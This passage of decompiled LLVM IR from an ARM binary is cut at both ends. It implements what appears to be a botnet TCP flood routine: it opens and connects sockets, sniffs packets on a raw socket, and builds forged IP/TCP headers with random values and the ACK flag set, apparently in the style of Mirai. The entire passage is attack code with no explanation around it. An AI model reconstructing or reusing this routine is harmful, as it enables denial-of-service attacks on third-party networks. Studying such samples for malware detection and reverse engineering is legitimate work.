  %v1_b15c = urem i32 %v6_ac9c, 2
  %tmp99 = sub nsw i32 0, %v1_b15c
  %v4_b164 = and i32 %tmp99, 8
  %v1_b174 = urem i32 %v6_acbc, 2
  %tmp100 = sub nsw i32 0, %v1_b174
  %v4_b17c = and i32 %tmp100, 4
  %v1_b18c = urem i32 %v6_acdc, 2
  %tmp101 = sub nsw i32 0, %v1_b18c
  %v3_b194 = and i32 %tmp101, 2
  %v1_b1a4 = urem i32 %v6_acfc, 2
  br label %dec_label_pc_ada0

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ada0.preheader, %dec_label_pc_af14
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_af14 ], [ %tmp34, %dec_label_pc_ada0.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_af14 ], [ %tmp37, %dec_label_pc_ada0.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_adac = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_adac, i32* %r0.global-to-local, align 4
  %v7_adb0 = icmp eq i32 %v3_adac, -1
  store i1 %v7_adb0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_adac, i32* @r5, align 4
  br i1 %v7_adb0, label %dec_label_pc_af14, label %dec_label_pc_adbc

dec_label_pc_adbc:                                ; preds = %dec_label_pc_ada0, %dec_label_pc_aef0
  %v0_adc4 = phi i32 [ %v3_af04, %dec_label_pc_aef0 ], [ %v3_adac, %dec_label_pc_ada0 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_aef0 ], [ %stack_var_-62.0, %dec_label_pc_ada0 ]
  %stack_var_-60.1 = phi i32 [ %v0_afc4, %dec_label_pc_aef0 ], [ %stack_var_-60.0, %dec_label_pc_ada0 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_adc4 = call i32 @__libc_fcntl(i32 %v0_adc4, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_adcc = or i32 %v2_adc4, 2048
  store i32 %v1_adcc, i32* @r2, align 4
  %v0_add0 = load i32, i32* @r5, align 4
  store i32 %v0_add0, i32* %r0.global-to-local, align 4
  %v2_add4 = call i32 @__libc_fcntl(i32 %v0_add0, i32 4)
  %v3_add8 = load i32, i32* %stack_var_-44, align 4
  %v5_ade0 = mul i32 %v3_add8, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_adec, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_adf4 = add i32 %v5_ade0, %arg2
  store i32 %v2_adf4, i32* %r3.global-to-local, align 4
  %v1_adf8 = add i32 %v2_adf4, 20
  %v2_adf8 = inttoptr i32 %v1_adf8 to i8*
  %v3_adf8 = load i8, i8* %v2_adf8, align 1
  %v4_adf8 = zext i8 %v3_adf8 to i32
  store i32 %v4_adf8, i32* %r2.global-to-local, align 4
  %v2_adfc = icmp ugt i8 %v3_adf8, 30
  %v7_adfc = icmp eq i8 %v3_adf8, 31
  store i1 %v7_adfc, i1* %cpsr_z.global-to-local, align 1
  %v2_ae00 = xor i1 %v7_adfc, true
  %v3_ae00 = and i1 %v2_adfc, %v2_ae00
  br i1 %v3_ae00, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_adbc
  %v5_ae00 = add i32 %v2_adf4, 16
  %v6_ae00 = inttoptr i32 %v5_ae00 to i32*
  %v7_ae00 = load i32, i32* %v6_ae00, align 4
  store i32 %v7_ae00, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_adbc, %bb
  %v4_ae04 = phi i32 [ %v2_adf4, %dec_label_pc_adbc ], [ %v7_ae00, %bb ]
  %v4_ae04.stack_var_-60.1 = select i1 %v3_ae00, i32 %v4_ae04, i32 %stack_var_-60.1
  %v2_ae08 = xor i1 %v2_adfc, true
  %v3_ae08 = or i1 %v7_adfc, %v2_ae08
  br i1 %v3_ae08, label %dec_label_pc_af50, label %dec_label_pc_ae0c

dec_label_pc_ae0c:                                ; preds = %bb71, %dec_label_pc_af50
  %v0_afc4 = phi i32 [ %v5_afa0, %dec_label_pc_af50 ], [ %v4_ae04.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ae14 = load i32, i32* @sl, align 4
  %v9_ae14 = icmp eq i32 %v0_ae14, 65535
  store i1 %v9_ae14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ae14, label %dec_label_pc_afac, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_ae0c
  %v4_ae18 = udiv i32 %v0_ae14, 256
  %v2_ae1c = urem i32 %v0_ae14, 256
  store i32 %v2_ae1c, i32* %r2.global-to-local, align 4
  %v5_ae20 = mul nuw nsw i32 %v2_ae1c, 256
  %v6_ae20 = or i32 %v5_ae20, %v4_ae18
  store i32 %v6_ae20, i32* %r3.global-to-local, align 4
  store i32 %v2_adec, i32* %r0.global-to-local, align 4
  %v2_ae28 = trunc i32 %v6_ae20 to i16
  store i16 %v2_ae28, i16* %v5_ae28, align 2
  br label %dec_label_pc_ae30

dec_label_pc_ae30:                                ; preds = %.thread9, %dec_label_pc_afac
  %stack_var_-62.2 = phi i16 [ %v1_afac, %dec_label_pc_afac ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_ae30, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_ae38 = load i32, i32* @r5, align 4
  store i32 %v0_ae38, i32* %r0.global-to-local, align 4
  %v3_ae3c = call i32 @__libc_connect(i32 %v0_ae38, i32 %v2_ae30, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ae44 = call i32 @__GI_time(i32* null)
  store i32 %v2_ae44, i32* %r0.global-to-local, align 4
  store i32 %v2_ae44, i32* @r4, align 4
  %v9_aea4 = icmp eq i32 %tmp35, %v0_afc4
  %v4_aecc = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_aea4 to i32
  %v9_aeb8 = icmp eq i1 %v9_aea4, false
  %v9_aed0 = icmp eq i32 %v3_aec4, %v4_aecc
  br label %dec_label_pc_ae60

dec_label_pc_ae50:                                ; preds = %.thread, %dec_label_pc_aec0, %dec_label_pc_aee8, %bb75
  %v2_ae50 = call i32 @__GI_time(i32* null)
  %v0_ae54 = load i32, i32* @r4, align 4
  %v2_ae54 = sub i32 %v2_ae50, %v0_ae54
  store i32 %v2_ae54, i32* %r0.global-to-local, align 4
  %v7_ae58 = icmp eq i32 %v2_ae54, 10
  store i1 %v7_ae58, i1* %cpsr_z.global-to-local, align 1
  %v8_ae5c = icmp sgt i32 %v2_ae54, 10
  br i1 %v8_ae5c, label %dec_label_pc_aef0, label %dec_label_pc_ae60

dec_label_pc_ae60:                                ; preds = %dec_label_pc_ae50, %dec_label_pc_ae30
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_ae74, i32* %r1.global-to-local, align 4
  store i32 %v2_ae78, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ae80 = load i32, i32* @sb, align 4
  store i32 %v0_ae80, i32* %r0.global-to-local, align 4
  %v6_ae88 = call i32 @__libc_recvfrom(i32 %v0_ae80, i32 %v2_ae74, i32 256, i32 16384, i32 %v2_ae68, i32 %v2_ae78)
  store i32 %v6_ae88, i32* %r2.global-to-local, align 4
  %v7_ae90 = icmp eq i32 %v6_ae88, -1
  store i1 %v7_ae90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_ae90, label %dec_label_pc_af44, label %dec_label_pc_ae9c

dec_label_pc_ae9c:                                ; preds = %dec_label_pc_ae60
  store i32 %v0_afc4, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_aeb0 = icmp eq i32 %v6_ae88, 40
  store i1 %v7_aeb0, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_ae88, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_ae9c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ae50

bb75:                                             ; preds = %dec_label_pc_ae9c
  store i1 %v9_aeb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aeb8, label %dec_label_pc_ae50, label %dec_label_pc_aec0

dec_label_pc_aec0:                                ; preds = %bb75
  store i32 %v3_aec4, i32* @lr, align 4
  store i32 %v2_adec, i32* @r3, align 4
  store i32 %v4_aecc, i32* %r2.global-to-local, align 4
  store i1 %v9_aed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aed0, label %dec_label_pc_aed8, label %dec_label_pc_ae50

dec_label_pc_aed8:                                ; preds = %dec_label_pc_aec0
  store i32 %v4_aed8, i32* %r2.global-to-local, align 4
  store i32 %v1_aedc, i32* @r3, align 4
  store i1 %v2_aee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aee0, label %dec_label_pc_afbc, label %dec_label_pc_aee8

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aed8
  store i1 %v2_aee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aee8, label %dec_label_pc_ae50, label %dec_label_pc_aef0

dec_label_pc_aef0:                                ; preds = %dec_label_pc_aee8, %dec_label_pc_ae50
  %v0_aef0 = load i32, i32* @r5, align 4
  store i32 %v0_aef0, i32* %r0.global-to-local, align 4
  %v1_aef4 = call i32 @__GI___libc_close(i32 %v0_aef0)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_af04 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_af04, i32* %r0.global-to-local, align 4
  %v3_af08 = icmp eq i32 %v3_af04, -1
  %v8_af08 = icmp eq i32 %v3_af04, -1
  store i1 %v8_af08, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_af04, i32* @r5, align 4
  br i1 %v3_af08, label %dec_label_pc_af14, label %dec_label_pc_adbc

dec_label_pc_af14:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ada0, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_ada0 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_aef0 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_ada0 ], [ %v0_afc4, %bb82 ], [ %v0_afc4, %dec_label_pc_aef0 ]
  %v3_af14 = load i32, i32* %stack_var_-44, align 4
  %v1_af18 = add i32 %v3_af14, 1
  store i32 %v1_af18, i32* @r3, align 4
  %v1_af1c = load i32, i32* @r6, align 4
  %v9_af1c = icmp eq i32 %v1_af18, %v1_af1c
  store i1 %v9_af1c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_af18, i32* %stack_var_-44, align 4
  %v5_af24 = icmp slt i32 %v1_af18, %v1_af1c
  br i1 %v5_af24, label %dec_label_pc_ada0, label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_af14
  store i32 %v6_ad1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1d8

dec_label_pc_af3c:                                ; preds = %dec_label_pc_ad60
  %v0_af3c = load i32, i32* @sb, align 4
  store i32 %v0_af3c, i32* %r0.global-to-local, align 4
  %v1_af40 = call i32 @__GI___libc_close(i32 %v0_af3c)
  store i32 %v1_af40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af44

dec_label_pc_af44:                                ; preds = %dec_label_pc_ae60, %entry, %dec_label_pc_af3c
  %v1_af4c = phi i32 [ %v3_ad50, %entry ], [ %v1_af40, %dec_label_pc_af3c ], [ 0, %dec_label_pc_ae60 ]
  store i32 %v27_ab7c, i32* %lr.global-to-local, align 4
  ret i32 %v1_af4c

dec_label_pc_af50:                                ; preds = %bb71
  %v1_af50 = add i32 %v4_ae04, 16
  %v2_af50 = inttoptr i32 %v1_af50 to i32*
  %v3_af50 = load i32, i32* %v2_af50, align 4
  store i32 %v3_af50, i32* @r4, align 4
  %v0_af54 = call i32 @rand_next()
  store i32 %v0_af54, i32* %r0.global-to-local, align 4
  %v3_af58 = load i32, i32* %stack_var_-44, align 4
  %v5_af60 = mul i32 %v3_af58, 24
  %v0_af68 = load i32, i32* @r4, align 4
  %v1_af68 = and i32 %v0_af68, 16711680
  store i32 %v1_af68, i32* %ip.global-to-local, align 4
  %v3_af6c = udiv i32 %v0_af68, 16777216
  %v2_af70 = add i32 %v5_af60, %arg2
  store i32 %v2_af70, i32* %r1.global-to-local, align 4
  %v4_af74 = udiv i32 %v1_af68, 256
  %v5_af74 = or i32 %v4_af74, %v3_af6c
  store i32 %v5_af74, i32* %r2.global-to-local, align 4
  %v1_af78 = and i32 %v0_af68, 65280
  store i32 %v1_af78, i32* %r3.global-to-local, align 4
  %v1_af7c = add i32 %v2_af70, 20
  %v2_af7c = inttoptr i32 %v1_af7c to i8*
  %v3_af7c = load i8, i8* %v2_af7c, align 1
  %v4_af7c = zext i8 %v3_af7c to i32
  store i32 %v4_af7c, i32* %ip.global-to-local, align 4
  %v5_af84 = call i32 @llvm.bswap.i32(i32 %v0_af68)
  %v7_af88 = lshr i32 %v0_af54, %v4_af7c
  %v8_af88 = add i32 %v7_af88, %v5_af84
  store i32 %v8_af88, i32* %r2.global-to-local, align 4
  %v1_af8c = and i32 %v8_af88, 16711680
  store i32 %v1_af8c, i32* %r0.global-to-local, align 4
  %v1_af98 = and i32 %v8_af88, 65280
  store i32 %v1_af98, i32* %r1.global-to-local, align 4
  %v5_afa0 = call i32 @llvm.bswap.i32(i32 %v8_af88)
  store i32 %v5_afa0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ae0c

dec_label_pc_afac:                                ; preds = %dec_label_pc_ae0c
  %v0_afac = call i32 @rand_next()
  %v1_afac = trunc i32 %v0_afac to i16
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  store i32 %v2_adec, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ae30

dec_label_pc_afbc:                                ; preds = %dec_label_pc_aed8
  %v3_afbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_afbc, i32* @r4, align 4
  store i32 %v2_ab98, i32* %ip.global-to-local, align 4
  %v5_afc4 = mul i32 %v3_afbc, 16
  %v6_afc4 = add i32 %v5_afc4, %v2_ab98
  %v7_afc4 = inttoptr i32 %v6_afc4 to i32*
  store i32 %v0_afc4, i32* %v7_afc4, align 4
  %v0_afc8 = load i32, i32* @r8, align 4
  %v1_afc8 = add i32 %v0_afc8, 4
  %v2_afc8 = inttoptr i32 %v1_afc8 to i32*
  %v3_afc8 = load i32, i32* %v2_afc8, align 4
  store i32 %v3_afc8, i32* %r1.global-to-local, align 4
  %v1_afd4 = and i32 %v3_afc8, 65280
  store i32 %v1_afd4, i32* %r2.global-to-local, align 4
  store i32 %v2_ab98, i32* %r0.global-to-local, align 4
  %v0_afe4 = load i32, i32* @r4, align 4
  %v3_afe4 = mul i32 %v0_afe4, 16
  %v2_afe8 = add i32 %v3_afe4, %v2_ab98
  store i32 %v2_afe8, i32* %ip.global-to-local, align 4
  %v5_afec = call i32 @llvm.bswap.i32(i32 %v3_afc8)
  store i32 %v5_afec, i32* %r3.global-to-local, align 4
  %v2_aff0 = add i32 %v2_afe8, 4
  %v3_aff0 = inttoptr i32 %v2_aff0 to i32*
  store i32 %v5_afec, i32* %v3_aff0, align 4
  %v0_aff4 = load i32, i32* @r8, align 4
  %v1_aff4 = add i32 %v0_aff4, 8
  %v2_aff4 = inttoptr i32 %v1_aff4 to i32*
  %v3_aff4 = load i32, i32* %v2_aff4, align 4
  store i32 %v3_aff4, i32* %r1.global-to-local, align 4
  %v1_aff8 = and i32 %v3_aff4, 16711680
  store i32 %v1_aff8, i32* %r0.global-to-local, align 4
  store i32 %v6_ad1c, i32* %r2.global-to-local, align 4
  %v5_b010 = call i32 @llvm.bswap.i32(i32 %v3_aff4)
  store i32 %v5_b010, i32* %r3.global-to-local, align 4
  %v1_b014 = add i32 %v0_aff4, 2
  %v2_b014 = inttoptr i32 %v1_b014 to i16*
  %v3_b014 = load i16, i16* %v2_b014, align 2
  %v4_b014 = zext i16 %v3_b014 to i32
  store i32 %v4_b014, i32* %r1.global-to-local, align 4
  store i32 %v1_b018, i32* @r7, align 4
  %v0_b01c = load i32, i32* @lr, align 4
  %v1_b01c = trunc i32 %v0_b01c to i16
  %v2_b01c = load i32, i32* %ip.global-to-local, align 4
  %v3_b01c = add i32 %v2_b01c, 14
  %v4_b01c = inttoptr i32 %v3_b01c to i16*
  store i16 %v1_b01c, i16* %v4_b01c, align 2
  %v0_b020 = load i32, i32* %r1.global-to-local, align 4
  %v1_b020 = trunc i32 %v0_b020 to i16
  %v2_b020 = load i32, i32* %ip.global-to-local, align 4
  %v3_b020 = add i32 %v2_b020, 12
  %v4_b020 = inttoptr i32 %v3_b020 to i16*
  store i16 %v1_b020, i16* %v4_b020, align 2
  %v0_b024 = load i32, i32* %r3.global-to-local, align 4
  %v1_b024 = load i32, i32* %ip.global-to-local, align 4
  %v2_b024 = add i32 %v1_b024, 8
  %v3_b024 = inttoptr i32 %v2_b024 to i32*
  store i32 %v0_b024, i32* %v3_b024, align 4
  %v0_b028 = load i32, i32* @r7, align 4
  store i32 %v0_b028, i32* @r0, align 4
  %v0_b02c = call i32 @malloc()
  store i32 %v0_b02c, i32* %r0.global-to-local, align 4
  store i32 %v2_aba8, i32* %r3.global-to-local, align 4
  %v2_b038 = load i32, i32* @r4, align 4
  %v5_b038 = mul i32 %v2_b038, 4
  %v6_b038 = add i32 %v5_b038, %v2_aba8
  %v7_b038 = inttoptr i32 %v6_b038 to i32*
  store i32 %v0_b02c, i32* %v7_b038, align 4
  %v3_b03c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b03c, i32* %r2.global-to-local, align 4
  %v0_b040 = load i32, i32* %r3.global-to-local, align 4
  %v4_b040 = mul i32 %v3_b03c, 4
  %v5_b040 = add i32 %v0_b040, %v4_b040
  %v6_b040 = inttoptr i32 %v5_b040 to i32*
  %v7_b040 = load i32, i32* %v6_b040, align 4
  store i32 %v7_b040, i32* @r4, align 4
  %v1_b044 = inttoptr i32 %v7_b040 to i8*
  %v2_b044 = load i8, i8* %v1_b044, align 1
  %tmp103 = urem i8 %v2_b044, 16
  %v1_b048 = zext i8 %tmp103 to i32
  %v1_b04c = or i32 %v1_b048, 64
  store i32 %v1_b04c, i32* %r3.global-to-local, align 4
  %v1_b050 = trunc i32 %v1_b04c to i8
  store i8 %v1_b050, i8* %v1_b044, align 1
  %v0_b054 = load i32, i32* @r4, align 4
  %v1_b054 = inttoptr i32 %v0_b054 to i8*
  %v2_b054 = load i8, i8* %v1_b054, align 1
  %v0_b058 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b058, 256
  %v1_b060 = and i8 %v2_b054, -16
  %v1_b064 = or i8 %v1_b060, 5
  %v1_b068 = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b058, 256
  %v4_b06c = urem i32 %tmp78, 256
  %v5_b06c = or i32 %v4_b06c, %v1_b068
  store i32 %v5_b06c, i32* %r2.global-to-local, align 4
  %v0_b070 = load i32, i32* @fp, align 4
  %v1_b070 = urem i32 %v0_b070, 256
  store i32 %v1_b070, i32* %r0.global-to-local, align 4
  store i32 %v1_ac28, i32* %ip.global-to-local, align 4
  %v3_b078 = udiv i32 %v0_b070, 256
  store i32 %v3_b078, i32* %r1.global-to-local, align 4
  store i8 %v1_b064, i8* %v1_b054, align 1
  %v0_b080 = load i32, i32* %r1.global-to-local, align 4
  %v1_b080 = load i32, i32* %r0.global-to-local, align 4
  %v4_b080 = mul i32 %v1_b080, 256
  %v5_b080 = or i32 %v4_b080, %v0_b080
  store i32 %v5_b080, i32* %r1.global-to-local, align 4
  store i32 %v4_b084, i32* %r0.global-to-local, align 4
  %v2_b088 = load i32, i32* @r4, align 4
  %v3_b088 = add i32 %v2_b088, 1
  %v4_b088 = inttoptr i32 %v3_b088 to i8*
  store i8 %v5_abe0, i8* %v4_b088, align 1
  %v0_b08c = load i32, i32* %r1.global-to-local, align 4
  %v1_b08c = trunc i32 %v0_b08c to i16
  %v2_b08c = load i32, i32* @r4, align 4
  %v3_b08c = add i32 %v2_b08c, 4
  %v4_b08c = inttoptr i32 %v3_b08c to i16*
  store i16 %v1_b08c, i16* %v4_b08c, align 2
  %v0_b090 = load i32, i32* %ip.global-to-local, align 4
  %v2_b090 = icmp eq i32 %v0_b090, 0
  store i1 %v2_b090, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b094, i32* %r1.global-to-local, align 4
  %v0_b098 = load i32, i32* %r2.global-to-local, align 4
  %v1_b098 = trunc i32 %v0_b098 to i16
  %v2_b098 = load i32, i32* @r4, align 4
  %v3_b098 = add i32 %v2_b098, 2
  %v4_b098 = inttoptr i32 %v3_b098 to i16*
  store i16 %v1_b098, i16* %v4_b098, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b090, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_afbc
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_afbc, %bb79
  %v0_b0a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b0a4 = trunc i32 %v0_b0a4 to i8
  %v2_b0a4 = load i32, i32* @r4, align 4
  %v3_b0a4 = add i32 %v2_b0a4, 8
  %v4_b0a4 = inttoptr i32 %v3_b0a4 to i8*
  store i8 %v1_b0a4, i8* %v4_b0a4, align 1
  %v0_b0a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0a8 = trunc i32 %v0_b0a8 to i8
  %v2_b0a8 = load i32, i32* @r4, align 4
  %v3_b0a8 = add i32 %v2_b0a8, 9
  %v4_b0a8 = inttoptr i32 %v3_b0a8 to i8*
  store i8 %v1_b0a8, i8* %v4_b0a8, align 1
  %v0_b0ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0ac, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b0ac = load i32, i32* %r2.global-to-local, align 4
  %v2_b0ac = trunc i32 %v1_b0ac to i16
  %v3_b0ac = load i32, i32* @r4, align 4
  %v4_b0ac = add i32 %v3_b0ac, 6
  %v5_b0ac = inttoptr i32 %v4_b0ac to i16*
  store i16 %v2_b0ac, i16* %v5_b0ac, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_24d4c.56 to i32), i32* %r2.global-to-local, align 4
  %v2_b0b4 = load i32, i32* @global_var_24d4c.56, align 4
  store i32 %v2_b0b4, i32* %r1.global-to-local, align 4
  %v1_b0b8 = load i32, i32* @r4, align 4
  %v2_b0b8 = add i32 %v1_b0b8, 12
  %v3_b0b8 = inttoptr i32 %v2_b0b8 to i32*
  store i32 %v2_b0b4, i32* %v3_b0b8, align 4
  %v3_b0bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b0bc, i32* %r3.global-to-local, align 4
  store i32 %v2_ab98, i32* %ip.global-to-local, align 4
  %v4_b0c4 = mul i32 %v3_b0bc, 16
  %v5_b0c4 = add i32 %v4_b0c4, %v2_ab98
  %v6_b0c4 = inttoptr i32 %v5_b0c4 to i32*
  %v7_b0c4 = load i32, i32* %v6_b0c4, align 4
  store i32 %v7_b0c4, i32* %r2.global-to-local, align 4
  store i32 %v5_b0c4, i32* %r3.global-to-local, align 4
  %v1_b0d0 = load i32, i32* @r4, align 4
  %v2_b0d0 = add i32 %v1_b0d0, 16
  %v3_b0d0 = inttoptr i32 %v2_b0d0 to i32*
  store i32 %v7_b0c4, i32* %v3_b0d0, align 4
  %v0_b0d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0d4 = add i32 %v0_b0d4, 12
  %v2_b0d4 = inttoptr i32 %v1_b0d4 to i16*
  %v3_b0d4 = load i16, i16* %v2_b0d4, align 2
  %v4_b0d4 = zext i16 %v3_b0d4 to i32
  store i32 %v4_b0d4, i32* %r0.global-to-local, align 4
  %v1_b0d8 = add i32 %v0_b0d4, 8
  %v2_b0d8 = inttoptr i32 %v1_b0d8 to i32*
  %v3_b0d8 = load i32, i32* %v2_b0d8, align 4
  store i32 %v3_b0d8, i32* %r1.global-to-local, align 4
  %v2_b0dc = load i32, i32* @r4, align 4
  %v3_b0dc = add i32 %v2_b0dc, 20
  %v4_b0dc = inttoptr i32 %v3_b0dc to i16*
  store i16 %v3_b0d4, i16* %v4_b0dc, align 2
  %v0_b0e0 = load i32, i32* @r4, align 4
  %v1_b0e0 = add i32 %v0_b0e0, 20
  store i32 %v1_b0e0, i32* @r8, align 4
  %v1_b0e4 = add i32 %v0_b0e0, 33
  %v2_b0e4 = inttoptr i32 %v1_b0e4 to i8*
  %v3_b0e4 = load i8, i8* %v2_b0e4, align 1
  %v4_b0e4 = zext i8 %v3_b0e4 to i32
  store i32 %v4_b0e4, i32* %r2.global-to-local, align 4
  %v0_b0e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b0e8 = add i32 %v0_b0e0, 24
  %v3_b0e8 = inttoptr i32 %v2_b0e8 to i32*
  store i32 %v0_b0e8, i32* %v3_b0e8, align 4
  %v0_b0ec = load i32, i32* %r2.global-to-local, align 4
  %v1_b0ec = or i32 %v0_b0ec, 1
  store i32 %v1_b0ec, i32* %r2.global-to-local, align 4
  %v0_b0f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0f0 = add i32 %v0_b0f0, 4
  %v2_b0f0 = inttoptr i32 %v1_b0f0 to i32*
  %v3_b0f0 = load i32, i32* %v2_b0f0, align 4
  store i32 %v3_b0f0, i32* %r1.global-to-local, align 4
  %v1_b0f4 = add i32 %v0_b0f0, 14
  %v2_b0f4 = inttoptr i32 %v1_b0f4 to i16*
  %v3_b0f4 = load i16, i16* %v2_b0f4, align 2
  %v4_b0f4 = zext i16 %v3_b0f4 to i32
  store i32 %v4_b0f4, i32* %r3.global-to-local, align 4
  %v1_b0f8 = trunc i32 %v1_b0ec to i8
  %v2_b0f8 = load i32, i32* @r8, align 4
  %v3_b0f8 = add i32 %v2_b0f8, 13
  %v4_b0f8 = inttoptr i32 %v3_b0f8 to i8*
  store i8 %v1_b0f8, i8* %v4_b0f8, align 1
  %v0_b0fc = load i32, i32* %r3.global-to-local, align 4
  %v1_b0fc = trunc i32 %v0_b0fc to i16
  %v2_b0fc = load i32, i32* @r8, align 4
  %v3_b0fc = add i32 %v2_b0fc, 2
  %v4_b0fc = inttoptr i32 %v3_b0fc to i16*
  store i16 %v1_b0fc, i16* %v4_b0fc, align 2
  %v0_b100 = load i32, i32* @r8, align 4
  %v1_b100 = add i32 %v0_b100, 12
  %v2_b100 = inttoptr i32 %v1_b100 to i8*
  %v3_b100 = load i8, i8* %v2_b100, align 1
  %v4_b100 = zext i8 %v3_b100 to i32
  store i32 %v4_b100, i32* %r3.global-to-local, align 4
  %v1_b104 = add i32 %v0_b100, 13
  %v2_b104 = inttoptr i32 %v1_b104 to i8*
  %v3_b104 = load i8, i8* %v2_b104, align 1
  %v4_b104 = zext i8 %v3_b104 to i32
  %tmp104 = urem i8 %v3_b100, 16
  %v1_b108 = zext i8 %tmp104 to i32
  %v1_b10c = or i32 %v1_b108, 128
  store i32 %v1_b10c, i32* %r3.global-to-local, align 4
  %v1_b110 = or i32 %v4_b104, 16
  store i32 %v1_b110, i32* %r2.global-to-local, align 4
  %v0_b114 = load i32, i32* %r1.global-to-local, align 4
  %v2_b114 = add i32 %v0_b100, 8
  %v3_b114 = inttoptr i32 %v2_b114 to i32*
  store i32 %v0_b114, i32* %v3_b114, align 4
  %v0_b118 = load i32, i32* %r3.global-to-local, align 4
  %v1_b118 = trunc i32 %v0_b118 to i8
  %v2_b118 = load i32, i32* @r8, align 4
  %v3_b118 = add i32 %v2_b118, 12
  %v4_b118 = inttoptr i32 %v3_b118 to i8*
  store i8 %v1_b118, i8* %v4_b118, align 1
  %v0_b11c = load i32, i32* %r2.global-to-local, align 4
  %v1_b11c = trunc i32 %v0_b11c to i8
  %v2_b11c = load i32, i32* @r8, align 4
  %v3_b11c = add i32 %v2_b11c, 13
  %v4_b11c = inttoptr i32 %v3_b11c to i8*
  store i8 %v1_b11c, i8* %v4_b11c, align 1
  %v0_b120 = call i32 @rand_next()
  %v1_b120 = trunc i32 %v0_b120 to i16
  store i32 %v0_b120, i32* %r0.global-to-local, align 4
  store i32 %v1_ac64, i32* %r1.global-to-local, align 4
  %v0_b128 = load i32, i32* @r8, align 4
  %v1_b128 = add i32 %v0_b128, 13
  %v2_b128 = inttoptr i32 %v1_b128 to i8*
  %v3_b128 = load i8, i8* %v2_b128, align 1
  %v4_b128 = zext i8 %v3_b128 to i32
  store i32 %v1_b12c, i32* %r2.global-to-local, align 4
  %v1_b130 = and i32 %v4_b128, 223
  %v5_b134 = or i32 %v1_b130, %v4_b134
  store i32 %v5_b134, i32* %r3.global-to-local, align 4
  %v1_b138 = trunc i32 %v5_b134 to i8
  store i8 %v1_b138, i8* %v2_b128, align 1
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_b140 = load i32, i32* @r8, align 4
  %v1_b140 = add i32 %v0_b140, 13
